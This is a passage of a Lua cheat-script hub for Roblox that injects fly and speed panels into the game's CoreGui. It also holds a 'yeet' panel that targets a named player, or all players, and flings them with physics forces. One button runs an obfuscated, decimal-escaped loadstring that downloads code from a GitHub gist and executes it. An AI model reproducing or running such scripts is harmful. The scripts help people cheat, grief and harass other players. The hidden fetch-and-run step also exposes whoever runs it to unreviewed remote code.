TextLabel.Position = UDim2.new(0.469327301, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 100, 0, 28)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Fly GUI V3"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

plus.Name = "plus"
plus.Parent = Frame
plus.BackgroundColor3 = Color3.fromRGB(133, 145, 255)
plus.Position = UDim2.new(0.231578946, 0, 0, 0)
plus.Size = UDim2.new(0, 45, 0, 28)
plus.Font = Enum.Font.SourceSans
plus.Text = "+"
plus.TextColor3 = Color3.fromRGB(0, 0, 0)
plus.TextScaled = true
plus.TextSize = 14.000
plus.TextWrapped = true

speed.Name = "speed"
speed.Parent = Frame
speed.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
speed.Position = UDim2.new(0.468421042, 0, 0.491228074, 0)
speed.Size = UDim2.new(0, 44, 0, 28)
speed.Font = Enum.Font.SourceSans
speed.Text = "1"
speed.TextColor3 = Color3.fromRGB(0, 0, 0)
speed.TextScaled = true
speed.TextSize = 14.000
speed.TextWrapped = true

mine.Name = "mine"
mine.Parent = Frame
mine.BackgroundColor3 = Color3.fromRGB(123, 255, 247)
mine.Position = UDim2.new(0.231578946, 0, 0.491228074, 0)
mine.Size = UDim2.new(0, 45, 0, 29)
mine.Font = Enum.Font.SourceSans
mine.Text = "-"
mine.TextColor3 = Color3.fromRGB(0, 0, 0)
mine.TextScaled = true
mine.TextSize = 14.000
mine.TextWrapped = true

closebutton.Name = "Close"
closebutton.Parent = main.Frame
closebutton.BackgroundColor3 = Color3.fromRGB(225, 25, 0)
closebutton.Font = "SourceSans"
closebutton.Size = UDim2.new(0, 45, 0, 28)
closebutton.Text = "X"
closebutton.TextSize = 30
closebutton.Position =  UDim2.new(0, 0, -1, 27)

mini.Name = "minimize"
mini.Parent = main.Frame
mini.BackgroundColor3 = Color3.fromRGB(192, 150, 230)
mini.Font = "SourceSans"
mini.Size = UDim2.new(0, 45, 0, 28)
mini.Text = "-"
mini.TextSize = 40
mini.Position = UDim2.new(0, 44, -1, 27)

mini2.Name = "minimize2"
mini2.Parent = main.Frame
mini2.BackgroundColor3 = Color3.fromRGB(192, 150, 230)
mini2.Font = "SourceSans"
mini2.Size = UDim2.new(0, 45, 0, 28)
mini2.Text = "+"
mini2.TextSize = 40
mini2.Position = UDim2.new(0, 44, -1, 57)
mini2.Visible = false

speeds = 1

local speaker = game:GetService("Players").LocalPlayer

local chr = game.Players.LocalPlayer.Character
local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")

nowe = false

game:GetService("StarterGui"):SetCore("SendNotification", { 
	Title = "Fly GUI V3";
	Text = "By me_ozone and Quandale The Dinglish XII#3550";
	Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
Duration = 5;

Frame.Active = true -- main = gui
Frame.Draggable = true

onof.MouseButton1Down:connect(function()

	if nowe == true then
		nowe = false

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)
		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
	else 
		nowe = true



		for i = 1, speeds do
			spawn(function()

				local hb = game:GetService("RunService").Heartbeat	


				tpwalking = true
				local chr = game.Players.LocalPlayer.Character
				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
				while tpwalking and hb:Wait() and chr and hum and hum.Parent do
					if hum.MoveDirection.Magnitude > 0 then
						chr:TranslateBy(hum.MoveDirection)
					end
				end

			end)
		end
		game.Players.LocalPlayer.Character.Animate.Disabled = true
		local Char = game.Players.LocalPlayer.Character
		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

		for i,v in next, Hum:GetPlayingAnimationTracks() do
			v:AdjustSpeed(0)
		end
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)
		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
	end




	if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then



		local plr = game.Players.LocalPlayer
		local torso = plr.Character.Torso
		local flying = true
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 50
		local speed = 0


		local bg = Instance.new("BodyGyro", torso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = torso.CFrame
		local bv = Instance.new("BodyVelocity", torso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		if nowe == true then
			plr.Character.Humanoid.PlatformStand = true
		end
		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
			game:GetService("RunService").RenderStepped:Wait()

			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
				speed = speed+.5+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
				speed = speed-1
				if speed < 0 then
					speed = 0
				end
			end
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
			else
				bv.velocity = Vector3.new(0,0,0)
			end
			--	game.Players.LocalPlayer.Character.Animate.Disabled = true
			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		end
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 0
		bg:Destroy()
		bv:Destroy()
		plr.Character.Humanoid.PlatformStand = false
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		tpwalking = false




	else
		local plr = game.Players.LocalPlayer
		local UpperTorso = plr.Character.UpperTorso
		local flying = true
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 50
		local speed = 0


		local bg = Instance.new("BodyGyro", UpperTorso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = UpperTorso.CFrame
		local bv = Instance.new("BodyVelocity", UpperTorso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		if nowe == true then
			plr.Character.Humanoid.PlatformStand = true
		end
		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
			wait()

			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
				speed = speed+.5+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
				speed = speed-1
				if speed < 0 then
					speed = 0
				end
			end
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
			else
				bv.velocity = Vector3.new(0,0,0)
			end

			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		end
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 0
		bg:Destroy()
		bv:Destroy()
		plr.Character.Humanoid.PlatformStand = false
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		tpwalking = false



	end





end)

local tis

up.MouseButton1Down:connect(function()
	tis = up.MouseEnter:connect(function()
		while tis do
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,1,0)
		end
	end)
end)

up.MouseLeave:connect(function()
	if tis then
		tis:Disconnect()
		tis = nil
	end
end)

local dis

down.MouseButton1Down:connect(function()
	dis = down.MouseEnter:connect(function()
		while dis do
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-1,0)
		end
	end)
end)

down.MouseLeave:connect(function()
	if dis then
		dis:Disconnect()
		dis = nil
	end
end)


game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(char)
	wait(0.7)
	game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
	game.Players.LocalPlayer.Character.Animate.Disabled = false

end)


plus.MouseButton1Down:connect(function()
	speeds = speeds + 1
	speed.Text = speeds
	if nowe == true then


		tpwalking = false
		for i = 1, speeds do
			spawn(function()

				local hb = game:GetService("RunService").Heartbeat	


				tpwalking = true
				local chr = game.Players.LocalPlayer.Character
				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
				while tpwalking and hb:Wait() and chr and hum and hum.Parent do
					if hum.MoveDirection.Magnitude > 0 then
						chr:TranslateBy(hum.MoveDirection)
					end
				end

			end)
		end
	end
end)
mine.MouseButton1Down:connect(function()
	if speeds == 1 then
		speed.Text = 'cannot be less than 1'
		wait(1)
		speed.Text = speeds
	else
		speeds = speeds - 1
		speed.Text = speeds
		if nowe == true then
			tpwalking = false
			for i = 1, speeds do
				spawn(function()

					local hb = game:GetService("RunService").Heartbeat	


					tpwalking = true
					local chr = game.Players.LocalPlayer.Character
					local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
					while tpwalking and hb:Wait() and chr and hum and hum.Parent do
						if hum.MoveDirection.Magnitude > 0 then
							chr:TranslateBy(hum.MoveDirection)
						end
					end

				end)
			end
		end
	end
end)

closebutton.MouseButton1Click:Connect(function()
	main:Destroy()
end)

mini.MouseButton1Click:Connect(function()
	up.Visible = false
	down.Visible = false
	onof.Visible = false
	plus.Visible = false
	speed.Visible = false
	mine.Visible = false
	mini.Visible = false
	mini2.Visible = true
	main.Frame.BackgroundTransparency = 1
	closebutton.Position =  UDim2.new(0, 0, -1, 57)
end)

mini2.MouseButton1Click:Connect(function()
	up.Visible = true
	down.Visible = true
	onof.Visible = true
	plus.Visible = true
	speed.Visible = true
	mine.Visible = true
	mini.Visible = true
	mini2.Visible = false
	main.Frame.BackgroundTransparency = 0 
	closebutton.Position =  UDim2.new(0, 0, -1, 27)
end)
end)


Section:NewButton("Fling Gui V3", "New overpower", function()
local lplayer = game:GetService('Players').LocalPlayer

local yeeting = false
function GetPlayer(String)
local Found = {}
local strl = String:lower()
if strl == "all" then
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
table.insert(Found,v)
end
elseif strl == "others" then
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.Name ~= lplayer.Name then
table.insert(Found,v)
end
end 
elseif strl == "me" then
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.Name == lplayer.Name then
table.insert(Found,v)
end
end 
else
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.Name:lower():sub(1, #String) == String:lower() then
table.insert(Found,v)
end
end 
end
return Found 
end
function ahh(thing)
local asd = {'yeet','gui','yeet gui'}
local f = string.upper(asd[math.random(1,#asd)])
return f
end
local XD = Instance.new("ScreenGui")
local BeGONE = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local AA = Instance.new("TextBox")
local yets = Instance.new("TextButton")
local stopyets = Instance.new("TextButton")
local ultrayets = Instance.new("TextButton")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel_3 = Instance.new("TextLabel")
XD.Name = "XD"
XD.Parent = game:GetService('CoreGui')
BeGONE.Name = "BeGONE"
BeGONE.Parent = XD
BeGONE.Active = true
BeGONE.Draggable = true
BeGONE.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
BeGONE.BorderSizePixel = 0
BeGONE.Position = UDim2.new(-0.0207920745, 111, 0.722570539, -1)
BeGONE.Size = UDim2.new(0, 389, 0, 129)
TextLabel.Parent = BeGONE
TextLabel.BackgroundColor3 = Color3.new(1, 0.419608, 0.129412)
TextLabel.BorderSizePixel = 0
TextLabel.Size = UDim2.new(0, 389, 0, 22)
TextLabel.Font = Enum.Font.Cartoon
TextLabel.Text = "fe yeet gui v3 (yes v3 xd) by scuba kermit"
TextLabel.TextColor3 = Color3.new(0, 0, 0)
TextLabel.TextSize = 16
TextLabel.TextWrapped = true
TextLabel_2.Parent = BeGONE
TextLabel_2.BackgroundColor3 = Color3.new(0.831373, 0.509804, 0.054902)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0, 0, 0.169230849, 0)
TextLabel_2.Size = UDim2.new(0, 389, 0, 9)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = ""
TextLabel_2.TextColor3 = Color3.new(0, 0, 0)
TextLabel_2.TextSize = 14
AA.Name = "AA"
AA.Parent = BeGONE
AA.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
AA.BorderSizePixel = 0
AA.Position = UDim2.new(0.20364143, 0, 0.299216866, 0)
AA.Size = UDim2.new(0, 229, 0, 35)
AA.Font = Enum.Font.SourceSans
AA.PlaceholderColor3 = Color3.new(0.831373, 0.831373, 0.831373)
AA.PlaceholderText = "Player you wanna yeet (can be shortened)"
AA.Text = ""
AA.TextColor3 = Color3.new(1, 1, 1)
AA.TextSize = 14
AA.TextWrapped = true
yets.Name = "yets"
yets.Parent = BeGONE
yets.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
yets.BorderSizePixel = 0
yets.Position = UDim2.new(0.0364736132, 0, 0.646153867, 0)
yets.Size = UDim2.new(0, 94, 0, 28)
yets.Font = Enum.Font.SourceSans
yets.Text = "Y E E T"
yets.TextColor3 = Color3.new(1, 1, 1)
yets.TextSize = 14
yets.TextWrapped = true
stopyets.Name = "stopyets"
stopyets.Parent = BeGONE
stopyets.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
stopyets.BorderSizePixel = 0
stopyets.Position = UDim2.new(0.722082794, 0, 0.646153867, 0)
stopyets.Size = UDim2.new(0, 94, 0, 28)
stopyets.Font = Enum.Font.SourceSans
stopyets.Text = "Stop Y E E T ing"
stopyets.TextColor3 = Color3.new(1, 1, 1)
stopyets.TextSize = 14
stopyets.TextWrapped = true
ultrayets.Name = "ultrayets"
ultrayets.Parent = BeGONE
ultrayets.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
ultrayets.BorderSizePixel = 0
ultrayets.Position = UDim2.new(0.298684418, 0, 0.646154106, 0)
ultrayets.Size = UDim2.new(0, 156, 0, 28)
ultrayets.Font = Enum.Font.SourceSans
ultrayets.Text = "U L T R A Y E E T"
ultrayets.TextColor3 = Color3.new(1, 1, 1)
ultrayets.TextSize = 14
ultrayets.TextWrapped = true
ImageLabel.Parent = XD
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.9, 0, 0.835423172, 0)
ImageLabel.Size = UDim2.new(0, 100, 0, 100)
ImageLabel.Image = "rbxassetid://2152234287"
TextLabel_3.Parent = ImageLabel
TextLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_3.BackgroundTransparency = 1
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.110989988, 0, 0.103538811, 0)
TextLabel_3.Size = UDim2.new(0, 77, 0, 23)
TextLabel_3.Font = Enum.Font.Arial
TextLabel_3.Text = "yeet gui"
TextLabel_3.TextColor3 = Color3.new(0, 0, 0)
TextLabel_3.TextSize = 14
yets.MouseButton1Click:Connect(function()
local target = unpack(GetPlayer(AA.Text)).Character

game:GetService'Players'.LocalPlayer.Character.Humanoid.PlatformStand = true
yeeting = true
local coin = Instance.new('BodyThrust',game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart)
coin.Force = Vector3.new(2590,0,2590)
coin.Name = "yeetforce"
repeat game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = target.Head.CFrame;coin.Location = target.Head.Position game["Run Service"].Heartbeat:wait() until not target.Head or yeeting == false
end)

stopyets.MouseButton1Click:Connect(function()
ypcall(function()
game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart.yeetforce:Destroy()
game:GetService'Players'.LocalPlayer.Character.Humanoid.PlatformStand = false
end)
yeeting = false
end)
ultrayets.MouseButton1Click:Connect(function()
local target = unpack(GetPlayer(AA.Text)).Character

game:GetService'Players'.LocalPlayer.Character.Humanoid.PlatformStand = true
yeeting = true
local coin = Instance.new('BodyThrust',game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart)
coin.Force = Vector3.new(9999,9999,9999)
coin.Name = "yeetforce"
repeat game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = target.Head.CFrame;coin.Location = target.Head.Position game["Run Service"].Heartbeat:wait() until not target.Head or yeeting == false
end)

while game["Run Service"].Heartbeat:wait() do
ImageLabel.Rotation = ImageLabel.Rotation + 1
TextLabel_3.Text = ahh('yeet gui')
end
end)

Section:NewButton("Fly Gui V2", "FlyV2 Original", function()
--ARCEUS X FLY V2 SCRIPT BY me_ozoneYT
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
end)

Section:NewButton("Fly GUI ", "Fly Around like a bitch", function()
game:GetService("StarterGui"):SetCore("SendNotification",{

                Title = "Credits";

                Text = "Modified By SpekzZ";

                Duration = 3.5;

            })

-- Gui to Lua

-- Version: 3.2

-- Instances:

local main = Instance.new("ScreenGui")

local Frame = Instance.new("Frame")

local up = Instance.new("TextButton")

local down = Instance.new("TextButton")

local onof = Instance.new("TextButton")

local TextLabel = Instance.new("TextLabel")

local plus = Instance.new("TextButton")

local speed = Instance.new("TextLabel")

local mine = Instance.new("TextButton")

--Properties:

main.Name = "main"

main.Parent = game.CoreGui

main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = main

Frame.BackgroundColor3 = Color3.fromRGB(163, 255, 137)

Frame.BorderColor3 = Color3.fromRGB(103, 221, 213)

Frame.Position = UDim2.new(0.100320168, 0, 0.379746825, 0)

Frame.Size = UDim2.new(0, 190, 0, 57)

up.Name = "up"

up.Parent = Frame

up.BackgroundColor3 = Color3.fromRGB(79, 255, 152)

up.Size = UDim2.new(0, 44, 0, 28)

up.Font = Enum.Font.SourceSans

up.Text = "UP"

up.TextColor3 = Color3.fromRGB(0, 0, 0)

up.TextSize = 14.000

down.Name = "down"

down.Parent = Frame

down.BackgroundColor3 = Color3.fromRGB(215, 255, 121)

down.Position = UDim2.new(0, 0, 0.491228074, 0)

down.Size = UDim2.new(0, 44, 0, 28)

down.Font = Enum.Font.SourceSans

down.Text = "DOWN"

down.TextColor3 = Color3.fromRGB(0, 0, 0)

down.TextSize = 14.000

onof.Name = "onof"

onof.Parent = Frame

onof.BackgroundColor3 = Color3.fromRGB(255, 249, 74)

onof.Position = UDim2.new(0.702823281, 0, 0.491228074, 0)

onof.Size = UDim2.new(0, 56, 0, 28)

onof.Font = Enum.Font.SourceSans

onof.Text = "fly"

onof.TextColor3 = Color3.fromRGB(0, 0, 0)

onof.TextSize = 14.000

TextLabel.Parent = Frame

TextLabel.BackgroundColor3 = Color3.fromRGB(242, 60, 255)

TextLabel.Position = UDim2.new(0.469327301, 0, 0, 0)

TextLabel.Size = UDim2.new(0, 100, 0, 28)

TextLabel.Font = Enum.Font.SourceSans

TextLabel.Text = "Fly Gui V2"

TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)

TextLabel.TextScaled = true

TextLabel.TextSize = 14.000

TextLabel.TextWrapped = true

plus.Name = "plus"

plus.Parent = Frame

plus.BackgroundColor3 = Color3.fromRGB(133, 145, 255)

plus.Position = UDim2.new(0.231578946, 0, 0, 0)

plus.Size = UDim2.new(0, 45, 0, 28)

plus.Font = Enum.Font.SourceSans

plus.Text = "+"

plus.TextColor3 = Color3.fromRGB(0, 0, 0)

plus.TextScaled = true

plus.TextSize = 14.000

plus.TextWrapped = true

speed.Name = "speed"

speed.Parent = Frame

speed.BackgroundColor3 = Color3.fromRGB(255, 85, 0)

speed.Position = UDim2.new(0.468421042, 0, 0.491228074, 0)

speed.Size = UDim2.new(0, 44, 0, 28)

speed.Font = Enum.Font.SourceSans

speed.Text = "1"

speed.TextColor3 = Color3.fromRGB(0, 0, 0)

speed.TextScaled = true

speed.TextSize = 14.000

speed.TextWrapped = true

mine.Name = "mine"

mine.Parent = Frame

mine.BackgroundColor3 = Color3.fromRGB(123, 255, 247)

mine.Position = UDim2.new(0.231578946, 0, 0.491228074, 0)

mine.Size = UDim2.new(0, 45, 0, 29)

mine.Font = Enum.Font.SourceSans

mine.Text = "-"

mine.TextColor3 = Color3.fromRGB(0, 0, 0)

mine.TextScaled = true

mine.TextSize = 14.000

mine.TextWrapped = true

speeds = 1

local speaker = game:GetService("Players").LocalPlayer

local chr = game.Players.LocalPlayer.Character

local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")

nowe = false

Frame.Active = true -- main = gui

Frame.Draggable = true

onof.MouseButton1Down:connect(function()

	if nowe == true then

		nowe = false

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)

		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)

	else 

		nowe = true

		for i = 1, speeds do

			spawn(function()

				local hb = game:GetService("RunService").Heartbeat	

				tpwalking = true

				local chr = game.Players.LocalPlayer.Character

				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")

				while tpwalking and hb:Wait() and chr and hum and hum.Parent do

					if hum.MoveDirection.Magnitude > 0 then

						chr:TranslateBy(hum.MoveDirection)

					end

				end

			end)

		end

		game.Players.LocalPlayer.Character.Animate.Disabled = true

		local Char = game.Players.LocalPlayer.Character

		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

		for i,v in next, Hum:GetPlayingAnimationTracks() do

			v:AdjustSpeed(0)

		end

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)

		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)

	end

	

		local plr = game.Players.LocalPlayer

